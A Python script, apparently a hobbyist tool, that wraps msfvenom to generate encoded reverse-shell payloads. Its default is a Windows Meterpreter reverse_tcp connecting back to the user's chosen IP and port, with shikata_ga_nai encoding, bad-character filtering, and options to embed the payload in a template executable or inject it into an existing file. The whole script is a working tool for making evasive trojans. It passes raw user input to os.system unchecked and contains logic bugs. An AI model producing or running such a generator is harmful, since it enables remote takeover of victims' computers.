#-*- coding: utf-8 -*-
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    #taken from https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-terminal-in-python
import os
import sys
import urllib.request
import getpass
os.system("apt-get install gedit")
os.system("clear")
print(" " + bcolors.HEADER)
if os.getuid() != 0:
    exit("This tool must be executed as Root")
print("                                                                   __     _______ _   _  ___  __  __ ")
print("                                                                   \ \   / / ____| \ | |/ _ \|  \/  |")
print("                                                                    \ \ / /|  _| |  \| | | | | |\/| |")
print("                                                                     \ V / | |___| |\  | |_| | |  | |")
print("                                                                      \_/  |_____|_| \_|\___/|_|  |_|")
print(bcolors.UNDERLINE + "                                                                                   ___________________________________________________________________________________________" + bcolors.ENDC)
print(" ")
print(" ")
print(bcolors.OKBLUE + "MsfVenomGenerator by" + bcolors.WARNING + " DasPinguinHD")
print(" ")
print("PRO-TIP: You can edit the badchars.txt file to personalize your Payload" + bcolors.ENDC)
print(" ")
print(" ")
print(" ")
input("Press enter to start")
os.system("clear")


try:
    print("Let's set your IP-Address. You'll most likely be using this tool in a local network, so you'll need your local IP-Address. If you want to see your local IP, type 'show IP' ")
    while True:
        lhost = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if lhost == "show IP":
            os.system("ifconfig")
            print("Your Wifi-Interface might be called something like wlan0 or wlan1. You'll need the inet: XXX.XXX.XX.XXX. If you don't see a WiFi-Interface, you might have a cable connection or simply no internet")
        elif lhost == "":
            print("Please enter a valid IP")
        else:
            break

    print("Now set your port. If you press enter, it'll be 4444")

    while True:
        lport= input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if lport == "":
            lport = "4444"
            break

        else:
            try:
                val1 = int(lport)
                print("Success")
                break
            except ValueError:
                print("Wrong input")


    print("Your port has been set.")
    print("Now you'll need a payload. If you want a list of available payloads, type 'show payloads'. Or just simply enter your payload . If you press enter, your Payload will be: windows/meterpreter/reverse_tcp.")
    while True:
        print("Payload:")
        payload = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if payload == "show payloads":
            os.system("msfvenom --list payloads")

        elif payload == "":
            print("payload set: windows/meterpreter/reverse_tcp.")
            payload = "windows/meterpreter/reverse_tcp"
            break
        else:
            print("Done")
            break


    print("Your payload has been registered")

    print("Now it's time to encode your payload: ")

    print("show encoders will show you a list of enocoders. If you press enter, it'll be set to x86/shikata_ga_nai. ")
    while True:
        encoder = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if encoder == "":
            encoder = "x86/shikata_ga_nai"
            print("Encoder: " + str(encoder))
            break
        elif encoder == "show encoders":
            os.system("msfvenom --list encoders")
        else:
            print("Encoder set")
            break

    print("Now enter how many times your payload should be encoded (Iterations). If you press enter, you'll have 4 Itertions. ")
    iteration = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
    if iteration == "":
        iteration = "4"
    else:
        print("Iterations set")
    while True:
        print("Now enter how many Bad-Chars you want: ")
        print("1,2,3,4")
        bchar = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if bchar == "1":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + "'"
            break
        if bchar == "2":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + "'"
            break
        if bchar == "3":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + str(currentline[2]) + "'"
            break
        if bchar == "4":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + str(currentline[2]) + str(currentline[3]) + "'"
            break

    print(str(badchar))

    print("Now enter o, x or k, to set the 'Mode' of the output file: ")
    while True:
        file = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if file == "o":
            x = "-o"
            print("Normal-Out")
            print(" ")
            print("Now enter a path, beginning at / (/home/USERNAME/FILENAME e. g.) Don't enter the suffix (exe, txt e. g.): ")
            template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Now enter a suffix, which matches to your target Payload and/or OS (e. g.: exe oder txt on Windows) (ENTER WITHOUT THE DOT! Don't enter .exe, rather enter exe): ")
            suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            break
        if file == "x":
            x = "-x"
            print("Template as Output")
            print("Enter an executable file as template. Start at the root directory '/'. For example if your template is here: enter this: /home/USERNAME/template.exe")
            template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Now enter a Name for your output (Such as: /home/USER/test1) (without the suffix): ")
            output1 = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Now enter the suffix (such as exe or txt e. g.)")
            output2 = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")

            break
        if file == "k":
            x = "-k"
            print("Code-Injection into an existing file")
            print(" ")
            print("Enter the path to the file, but don't enter the suffix of the file (like exe). Start from the root directory. ")
            template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Now enter the suffix of your file ")
            suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            break

        if file != "o" or "x" or "k":
            print("Wrong input!")
    print("Done, generating code...")

    outcmd = input("Do you want to execute the command now or just show it? (E/s): ")
    while True:
        if outcmd == "E":
            if file == "x":
                msfcode = "msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2)
                print("Executing... " + str(msfcode))
                os.system(str(msfcode))
                break
            if file == "o" or "k":
                print("Executing... msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                os.system("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                break

        elif outcmd == "s":
            try:
                if file == "x":
                    print("Your code: msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + " -o " + str(output1) + "." + str(output2))
                    break
                if file == "o" or "k":
                    print(" Your code: msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                    break
                else:
                    print(bcolors.WARNING + "invalid input, try again." + bcolors.ENDC)
            except Exception as e:
                print(str(e) + "Procceding anyway...")
except KeyboardInterrupt:
    print(" ")
    print(bcolors.WARNING + "Shutdown... Goodbye" + bcolors.ENDC)
except Exception as e:
    print("An error occured:" + str(e))
